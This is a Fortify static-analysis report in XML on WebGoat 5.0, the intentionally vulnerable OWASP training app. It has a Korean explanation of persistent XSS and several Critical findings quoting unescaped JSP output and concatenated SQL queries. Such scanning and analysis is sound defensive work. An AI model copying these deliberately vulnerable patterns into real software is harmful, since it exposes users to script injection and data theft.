<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ReportDefinition type="xml">
    <TemplateName>Fortify Security Report</TemplateName>
    <TemplatePath></TemplatePath>
    <LogoPath>/OT_logo.png</LogoPath>
    <Footnote>Copyright 2023 Open Text.</Footnote>
    <UserName>ikkb7</UserName>
    <ReportSection enabled="true" optionalSubsections="true">
        <Title>Executive Summary</Title>
        <SubSection enabled="true">
            <Title>Issues Overview</Title>
            <Description>This section provides an overview of the issues uncovered during analysis. The report covers a summary of vulnerability categories discovered by the tool. The auditor should augment this section with higher-level conclusions derived from human review of the application (including architecture reviews, black-box testing, compliance issues, etc.)</Description>
            <Text>On Feb 8, 2024, a source code review was performed over the project code base. 191 files, 9,038 LOC (Executable) were scanned and reviewed for defects that could lead to potential security vulnerabilities. A total of 1904 reviewed findings were uncovered during the analysis.</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Issue Summary by Fortify Priority Order</Title>
            <Description>A table summarizing the number of issues found and the breakdown of issues in each Fortify Priority Level</Description>
            <IssueListing listing="false" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="table">
                    <Axis>Fortify Priority Order</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="888">
                        <groupTitle>Critical</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="852">
                        <groupTitle>Low</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="136">
                        <groupTitle>High</groupTitle>
                    </GroupingSection>
                    <GroupingSection count="28">
                        <groupTitle>Medium</groupTitle>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
        <SubSection enabled="true">
            <Title>Recommendations and Conclusions</Title>
            <Description>This section gives some high-level recommendations on remediating the issues discussed in the Issues Summary sub section. Recommendations will vary based on deployment scenarios, risk appetite, and existing mitigating strategies. The auditor should supplement the Fortify generic recommendations with specific information that takes into account the application specific variables.</Description>
            <Text>The Issues Category section provides Fortify recommendations for addressing issues at a generic level.  The recommendations for specific fixes can be extrapolated from those generic recommendations by the development group.</Text>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="true">
        <Title>Project Summary</Title>
        <SubSection enabled="true">
            <Title>Code Base Summary</Title>
            <Description>Summary of the Codebase that was analyzed</Description>
            <Text>Code location: C:/Users/ikkb7/WebGoat-5.0_developer/project&#13;
Number of Files: 191&#13;
Lines of Code: 9038&#13;
Build Label: &lt;No Build Label&gt;</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Scan Information</Title>
            <Description>Details of the analysis</Description>
            <Text>Scan time: 02:39&#13;
SCA Engine version: 23.2.0.0125&#13;
Machine Name: kbkim-surface4&#13;
Username running scan: ikkb7</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Results Certification</Title>
            <Description>A full summary of the Results Certification for this project</Description>
            <Text>Results Certification Valid&#13;
&#13;
Details:&#13;
&#13;
Results Signature:

	SCA Analysis Results has Valid signature
	

Rules Signature:

	There were no custom rules used in this scan</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Attack Surface</Title>
            <Description>A full summary of the attack surface for this project</Description>
            <Text>Attack Surface:&#13;
Command Line Arguments:
	org.owasp.webgoat.lessons.Encoding.main
	org.owasp.webgoat.session.CreateDB.main
	org.owasp.webgoat.session.WebgoatProperties.main
	org.owasp.webgoat.util.Exec.main

File System:
	java.io.FileInputStream.FileInputStream
	java.io.FileInputStream.FileInputStream
	java.io.FileReader.FileReader
	java.io.FileReader.FileReader

Private Information:
	null.null.null
	java.util.Properties.getProperty
	javax.crypto.SecretKeyFactory.generateSecret
	org.owasp.webgoat.session.Employee.getCcn
	org.owasp.webgoat.session.Employee.getSsn

Java Properties:
	java.lang.System.getProperty
	java.util.Properties.load
	javax.servlet.GenericServlet.getInitParameter
	javax.servlet.ServletContext.getInitParameter

Stream:
	java.io.InputStream.read

System Information:
	null.null.null
	java.io.File.list
	java.lang.System.getProperty
	java.lang.System.getProperty
	java.lang.System.getProperty
	java.lang.Throwable.getLocalizedMessage
	java.lang.Throwable.getMessage
	java.lang.Throwable.getStackTrace
	javax.servlet.ServletContext.getInitParameter
	javax.servlet.ServletContext.getRealPath
	javax.servlet.ServletContext.getResourcePaths

Web:
	javax.servlet.http.HttpServletRequest.getMethod
</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Filter Set Summary</Title>
            <Description>A brief summary of the filterset used to create this report</Description>
            <Text>Current Enabled Filter Set:&#13;
Security Auditor View&#13;
&#13;
Filter Set Details:&#13;
&#13;
Folder Filters:
If [fortify priority order] contains critical Then set folder to Critical
If [fortify priority order] contains high Then set folder to High
If [fortify priority order] contains medium Then set folder to Medium
If [fortify priority order] contains low Then set folder to Low
Visibility Filters:
If category contains insecure dependency: vulnerable component AND [analysis type] contains sca Then hide issue</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Audit Guide Summary</Title>
            <Description>Summary of the impact of the audit guide</Description>
            <Text>Audit guide not enabled</Text>
        </SubSection>
    </ReportSection>
    <ReportSection enabled="true" optionalSubsections="true">
        <Title>Results Outline</Title>
        <SubSection enabled="true">
            <Title>Overall number of results</Title>
            <Description>Results count</Description>
            <Text>The scan found 1904 issues.</Text>
        </SubSection>
        <SubSection enabled="true">
            <Title>Vulnerability Examples by Category</Title>
            <Description>Results summary for critical and high priority issues.  Vulnerability examples are provided by category.</Description>
            <IssueListing listing="true" limit="-1">
                <Refinement></Refinement>
                <Chart chartType="list">
                    <Axis>Category</Axis>
                    <MajorAttribute>Analysis</MajorAttribute>
                    <GroupingSection count="512">
                        <groupTitle>Cross-Site Scripting: Persistent</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>BackDoors.java의 concept1() 메서드가 125 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>XSS(Cross-site scripting) 취약점은 다음 경우에 발생합니다.

1. 신뢰할 수 없는 소스를 통해 데이터가 웹 응용 프로그램에 입력됩니다. Persistent(Stored 라고도 함) XSS의 경우 신뢰할 수 없는 소스는 일반적으로 데이터베이스 또는 다른 백엔드 데이터 저장소이지만, Reflected XSS의 경우에는 일반적으로 웹 요청입니다.


2. 데이터는 검증 없이 웹 사용자에게 전달된 동적 콘텐트에 포함됩니다.

웹 브라우저에 전달되는 악성 콘텐트는 흔히 JavaScript 세그먼트의 형태를 취하지만 HTML, Flash 또는 기타 브라우저가 실행하는 다른 모든 유형의 코드를 포함할 수도 있습니다. XSS 기반의 공격은 거의 무제한으로 다양하지만, 흔히 쿠키 또는 기타 세션 정보와 같은 개인 데이터를 공격자에게 전송하여 피해자를 공격자가 제어하는 웹 콘텐트에 리디렉션하거나 피해 사이트로 위장하고 사용자 컴퓨터에 기타 악의적인 작업을 수행하는 것이 공통적인 수법입니다.


예제 1: 다음 JSP 코드 세그먼트는 지정된 직원 ID의 직원에 대한 데이터베이스를 쿼리하여 해당 직원의 이름을 인쇄합니다.


&lt;%...
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
   rs.next();
   String name = rs.getString("name");
}
%&gt;

Employee Name: &lt;%= name %&gt;



이 코드는 name의 값이 올바로 동작할 때는 정확하게 기능을 하지만 그렇지 않을 때는 익스플로이트를 방지하기 위한 아무 조치도 취하지 않습니다. 이 코드는 name의 값을 응용 프로그램이 콘텐트를 분명하게 관리하는 데이터베이스에서 읽기 때문에 위험하지 않은 것으로 보일 수 있습니다. 하지만 name의 값이 사용자가 제공하는 데이터에서 오는 경우 데이터베이스는 악성 콘텐트의 통로가 될 수 있습니다. 데이터베이스에 저장된 모든 데이터에 대한 적절한 입력값 검증 절차가 없으면 공격자는 사용자의 웹 브라우저에서 악의적인 명령을 실행할 수 있습니다. 이런 유형의 익스플로이트를 Persistent(또는 Stored) XSS라고 하는데 데이터 저장소가 사용하는 간접 참조 때문에 위협을 식별하기 어렵고 공격이 여러 사용자에게 가해질 가능성이 커지기 때문에 더욱 위험합니다. XSS는 방문자에게 "방명록"을 제공하는 웹 사이트에서 이런 형태로 시작되었습니다. 공격자가 방명록 항목에 JavaScript를 삽입하면 이후에 방명록 페이지를 방문하는 방문자는 모두 악성 코드를 실행하게 됩니다.


예제 2: 다음 JSP 코드 세그먼트는 HTTP 요청에서 직원 ID인 eid를 읽어 사용자에게 표시합니다.


&lt;% String eid = request.getParameter("eid"); %&gt;
...
Employee ID: &lt;%= eid %&gt;



Example 1에서처럼 이 코드는 eid에 표준 영숫자 텍스트만 있으면 올바로 동작합니다. eid가 메타 문자나 소스 코드가 포함된 값을 갖는 경우, 웹 브라우저가 HTTP 응답을 표시할 때 코드를 실행합니다.

처음에는 이것이 큰 취약점으로 보이지 않을 수도 있습니다. 결국 누군가 URL을 입력하여 자신의 컴퓨터에서 악성 코드가 실행되게 하는 이유는 무엇입니까? 정말 위험한 일은 공격자가 악성 URL을 만든 다음 전자 메일 또는 사회 공학 속임수를 사용하여 피해자가 URL의 링크를 방문하도록 만드는 것입니다. 피해자가 링크를 클릭하면 모르는 사이에 취약한 웹 응용 프로그램을 통해 해로운 내용을 본인의 컴퓨터로 전달하게 됩니다. 취약한 웹 응용 프로그램을 익스플로이트하는 메커니즘을 Reflected XSS 라고 합니다.

모바일 환경에서는 Cross-Site Scripting과 같은 전형적인 웹 응용 프로그램 취약성이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.

예제 3: 다음 코드는 Android의 WebView에서 JavaScript를 활성화(기본적으로 JavaScript는 비활성화됨)하고 Android 인텐트에서 받은 값을 기준으로 페이지를 로드합니다.


...
        WebView webview = (WebView) findViewById(R.id.webview);
        webview.getSettings().setJavaScriptEnabled(true);
        String url = this.getIntent().getExtras().getString("url");
        webview.loadUrl(url);
...


url 값이 javascript:로 시작하면 그 뒤에 오는 JavaScript 코드가 WebView 내에 있는 웹 페이지의 컨텍스트에서 실행됩니다.

예제에서처럼, XSS 취약점은 HTTP 응답에 확인되지 않은 데이터가 포함된 코드 때문에 발생합니다. XSS 공격이 피해자에게 가해지는 방식은 세 가지가 있습니다.

- Example 1에서처럼 응용 프로그램은 데이터베이스 또는 다른 신뢰할 수 있는 데이터 저장소에 데이터를 저장합니다. 그러면 위험한 데이터는 응용 프로그램이 다시 읽어 들여 동적 콘텐트에 포함시킵니다. Persistent XSS 익스플로이트는 공격자가 위험한 콘텐트를 데이터 저장소에 삽입하고 이 콘텐트를 나중에 읽어 들여 동적 콘텐트에 포함시킬 때 발생합니다. 공격자의 관점에서 악성 콘텐트를 삽입할 최적의 장소는 많은 사용자나 특히 관련 사용자에게 표시되는 장소입니다. 일반적으로 관련 사용자는 응용 프로그램에 권한을 높이거나 공격자가 원하는 민감한 데이터와 상호 작용합니다. 이런 사용자가 악성 콘텐트를 실행하면 공격자는 사용자 대신 권한 있는 작업을 실행하거나 사용자 소유의 민감한 데이터에 접근할 수 있습니다.

- Example 2에서처럼 데이터를 HTTP 요청에서 직접 읽어 들여 HTTP 응답에 다시 적용하는 것입니다. 적용된 XSS 익스플로이트는 공격자가 사용자로 하여금 위험한 콘텐트를 취약한 웹 응용 프로그램에 제공하도록 만드는 것입니다. 이 위험한 콘텐트는 다시 사용자에게 돌아가고 웹 브라우저가 이를 실행합니다. 악성 콘텐트를 제공하는 가장 일반적인 메커니즘은 콘텐트를 공용으로 게시하거나 피해자에게 직접 전자 메일로 보내지는 URL의 매개 변수로 포함하는 것입니다. 이런 식으로 생성된 URL은 많은 공격자가 피해자를 속여 피해 사이트를 참조하는 URL을 방문하게 하는 피싱 기법의 근간을 이룹니다. 사이트가 공격자의 콘텐트를 사용자에게 보내면, 콘텐트가 실행되고 세션 정보가 들어있는 쿠키 등의 개인 정보가 사용자의 컴퓨터에서 공격자에게 전송되거나 다른 악의적인 작업이 수행됩니다.

- Example 3과 같이 응용 프로그램 외부의 소스에서 데이터베이스 또는 기타 데이터 저장소에 위험한 데이터를 저장하고 위험한 데이터를 응용 프로그램이 신뢰할 수 있는 데이터로 읽어 들여 데이터가 동적 콘텐트에 포함됩니다.


많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>XSS 방지를 위한 해결 방법은 필요한 위치에서 유효성 검사가 수행되도록 하고 취약성을 방지하도록 관련 속성을 설정하는 것입니다.

XSS 취약점은 응용 프로그램이 출력에 악성 데이터를 포함할 때 발생하기 때문에 한 가지 논리적인 접근 방식은 데이터가 응용 프로그램을 벗어나기 직전에 데이터를 확인하는 것입니다. 하지만 웹 응용 프로그램에 동적 콘텐트 생성을 위한 복잡하고 까다로운 코드가 있기 때문에 이 방법은 생략(검증 누락) 오류가 발생할 가능성이 큽니다. 이런 위험을 완화하는 효과적인 방법 역시 XSS의 입력값 검증을 수행하는 것입니다.

웹 응용 프로그램은 SQL injection과 같은 다른 취약점을 방지하기 위해 모든 입력을 확인해야 합니다. 따라서 응용 프로그램의 기존 입력값 검증 메커니즘에 XSS 검사를 포함하도록 확대하는 것이 비교적 쉽습니다. XSS의 입력값 검증이 아무리 뛰어나더라도 엄격한 출력 검증을 대신할 수는 없습니다. 응용 프로그램은 공유 데이터 저장소 또는 기타 신뢰할 수 있는 소스를 통해 입력을 받는데 그 데이터 저장소가 적절한 입력값 검증을 수행하지 않는 소스에서 입력을 받을 수 있습니다. 따라서 응용 프로그램은 어떤 경우에도 이런 저런 데이터의 안전을 신뢰할 수 없습니다. 즉, XSS 취약점을 예방하는 최선의 방법은 응용 프로그램에 들어가고 응용 프로그램에서 사용자에게 전달되는 입력을 모두 확인하는 것입니다.

가장 안전한 XSS 검증 방법은 HTTP 컨텐츠에 사용할 수 있는 안전한 문자의 허용 목록을 만들어 이 승인된 집합의 문자만으로 이루어진 입력만 받는 것입니다. 예를 들어, 올바른 사용자 이름은 영숫자만 포함하거나 전화 번호는 숫자 0-9만 포함하도록 합니다. 하지만 이 방법은 문자를 인코딩한 후 브라우저에 특별한 의미가 있는 많은 문자를 올바른 입력으로 간주해야 하는 웹 응용 프로그램에서는 실효성이 떨어집니다. 그 예로 사용자로부터 HTML 코드를 입력받아야 하는 웹 디자인 게시판을 들 수 있습니다.

보다 유연하지만 안전성이 떨어지는 접근 방식은 거부 목록을 구현하는 것입니다. 거부 목록 방식은 입력을 사용하기 전에 위험한 문자를 선별적으로 거부하거나 이스케이프 처리합니다. 리스트를 만들려면 먼저 웹 브라우저에 특별한 의미가 있는 문자 집합을 이해해야 합니다. HTML 표준에 특별한 의미가 있는 문자가 정의되어 있는데도 많은 웹 브라우저가 HTML에서 흔히 발생하는 실수를 수정하려고 하고 다른 문자를 상황에 따라 특별한 의미로 처리할 수 있습니다. 그러므로 거부 목록을 사용하여 XSS를 방지하지 않는 것이 좋습니다. 카네기 멜론 대학 SEI(Software Engineering Institute)의 CERT(R) Coordination Center에서는 다음과 같이 여러 상황에서 특수 문자에 대한 세부 정보를 제공합니다[1].

Block-level element 항목(텍스트 단락 중간):

- "&lt;"는 태그가 시작되는 표시이기 때문에 특수합니다.

- "&amp;"는 문자 엔터티가 시작되는 표시이기 때문에 특수합니다.

- "&gt;"는 일부 브라우저에서 페이지 작성자가 여는 "&lt;"를 포함할 계획이었지만 실수로 누락했다는 가정하에 특수하게 처리되기 때문에 특수합니다.

다음 원칙은 속성 값에 적용됩니다.

- 큰따옴표로 묶은 속성 값에서 큰따옴표는 속성 값의 끝을 나타내기 때문에 특수합니다.

- 작은따옴표로 묶은 속성 값에서 작은따옴표는 속성 값의 끝을 나타내기 때문에 특수합니다.

- 따옴표가 없는 속성 값에서 공백 및 탭과 같은 공백 문자는 특수 문자입니다.

- "&amp;"는 특정 속성과 함께 사용될 때 문자 엔터티가 시작되는 곳이기 때문에 특수합니다. 

예를 들어, URL에서 검색 엔진은 결과 페이지 내에 사용자가 클릭만 하면 검색을 다시 실행할 수 있는 링크를 제공합니다. 이는 URL 내에 검색 쿼리를 인코딩하여 구현할 수 있는데 특수 문자를 추가로 도입하게 됩니다.

- 공백, 탭 및 줄 바꿈은 URL 끝을 나타내기 때문에 특수합니다.

- "&amp;"는 문자 엔터티의 시작을 나타내거나 CGI 매개 변수를 구분하기 때문에 특수합니다.

- ASCII가 아닌 문자(즉, ISO-8859-1 인코딩에서 127보다 큰 모든 문자)는 URL에 사용할 수 없기 때문에 이 상황에서 특수 문자로 간주됩니다.

- "%" 기호는 HTTP 이스케이프 시퀀스로 인코딩된 매개 변수가 서버 쪽 코드로 디코딩되는 경우 입력에서 필터링해야 합니다. 예를 들어, "%"는 "%68%65%6C%6C%6F"와 같은 입력이 웹 페이지에 나타날 때 "hello"가 되는 경우 필터링해야 합니다.


&lt;SCRIPT&gt; &lt;/SCRIPT&gt;의 본문 내에서:

- 세미콜론, 괄호, 중괄호 및 줄 바꿈 문자는 텍스트를 이전부터 존재하는 스크립트 태그에 바로 삽입하는 경우 필터링해야 합니다.

서버 쪽 스크립트:

- 입력의 느낌표(!)를 출력의 큰따옴표(")로 변환하는 서버 쪽 스크립트에는 추가 필터링이 필요합니다. 

기타 가능성:

- 공격자가 UTF-7로 요청을 제출하는 경우 특수 문자 "&lt;"가 '+ADw-'로 나타나고 필터링이 무시될 수 있습니다. 출력에 인코딩 형식을 명시적으로 지정하지 않는 페이지가 포함된 경우 일부 브라우저는 콘텐트(이 경우, UTF-7)에 기초하여 합리적으로 인코딩을 식별하려고 시도합니다.

응용 프로그램에서 XSS 공격을 확인하는 정확한 지점과 확인 과정에서 고려해야 하는 특수 문자를 식별한 후 다음 과제는 확인 과정에서 특수 문자를 처리하는 방법을 알아내는 것입니다. 특수 문자를 응용 프로그램의 올바른 입력으로 간주하지 않는 경우, 특수 문자가 들어 있는 모든 입력을 잘못된 것으로 판단하고 거부할 수 있습니다. 두 번째 옵션은 필터링으로 특수 문자를 제거하는 것입니다. 하지만 필터링은 필터링된 콘텐트의 표현을 변경시키는 부작용이 있기 때문에 입력 내용을 그대로 보존하여 표시해야 하는 경우에는 허용할 수 없습니다.

특수 문자가 있는 입력을 받아들여 그대로 표시해야 하는 경우, 검증 작업에서 특수 문자를 인코딩하여 특수한 의미를 제거해야 합니다. ISO 8859-1 특수 문자의 인코딩된 값의 완전한 목록이 공식 HTML 규격의 일부로 제공됩니다[2].

많은 응용 프로그램 서버가 응용 프로그램이 Cross-Site Scripting 공격에 필수적인 문자가 있는지 확인하는 특정 HTTP 응답 콘텐트 설정을 담당하는 기능을 구현하여 Cross-Site Scripting 취약점에 노출되는 것을 막으려고 합니다. 응용 프로그램을 실행하는 서버에 응용 프로그램의 보안을 맡길 수 없습니다. 개발된 응용 프로그램이 응용 프로그램의 수명 동안 어떤 서버에서 실행될지 알 수 없기 때문입니다. 표준 및 알려진 익스플로이트의 진화 속도에 따라 응용 프로그램 서버가 계속 진화한다는 보장이 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 데이터베이스에 신뢰할 수 없는 데이터를 쓰면 Fortify Secure Coding Rulepacks에서 SQL Injection 관련 경고를 표시하며, 데이터베이스를 신뢰할 수 없는 데이터의 소스로 처리하므로 XSS 취약성이 발생할 수 있습니다. 데이터베이스가 사용자 환경에서 신뢰할 수 있는 리소스인 경우, 사용자 지정 필터를 사용하여 DATABASE 감염 플래그를 포함하고 데이터베이스 소스에서 발생하는 데이터 흐름 이슈를 필터링하십시오. 그러나 데이터베이스에서 읽는 모든 내용을 확인하는 것이 여전히 효과적인 경우가 많습니다.

2. 비록 신뢰할 수 없는 데이터에 대한 URL 인코딩이 많은 XSS 공격을 막아주긴 하지만, 일부 브라우저(특히 Internet Explorer 6 및 7 그 외 다른 브라우저들)는 JavaScript 인터프리터로 전송하기 전에 DOM(Document Object Model) 내의 특정 지점에서 자동으로 내용을 해독합니다. 이러한 위험을 반영하기 위해 룰팩은 더 이상 Cross-Site Scripting을 방지하는 데 충분한 URL 인코딩 루틴을 처리하지 않습니다. URL 암호화 이후 도출되는 데이터 값으로 Fortify는 Cross-Site Scripting, Poor Validation 취약점을 보고할 수 있습니다.

3. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>512</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3A8E3BB2450E531B99FA728F81DEA042" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>StoredXss.java의 makeCurrent() 메서드가 239 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>239</LineStart>
<Snippet>		String messageData = results.getString(MESSAGE_COL);
		TR row2 = new TR(new TD(new B(new StringElement("Message:"))));
		row2.addElement(new TD(new StringElement(messageData)));
		t.addElement(row2);
</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>224</LineStart>
<Snippet>	    statement.setString(1, getNameroot(s.getUserName()) + "%");
	    statement.setInt(2, messageNum);
	    ResultSet results = statement.executeQuery();

	    if ((results != null) &amp;&amp; results.first())</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="78F57A1B2A3DEE2D918BE90FCEFBAD51" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F2E6ED93D8DFC4204FEB5FD93EB79CA1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="99F907C5412E0BEFBC7CEF0F625455C0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AD5E716A74B00FFBF4FE5CE93ADABE6B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
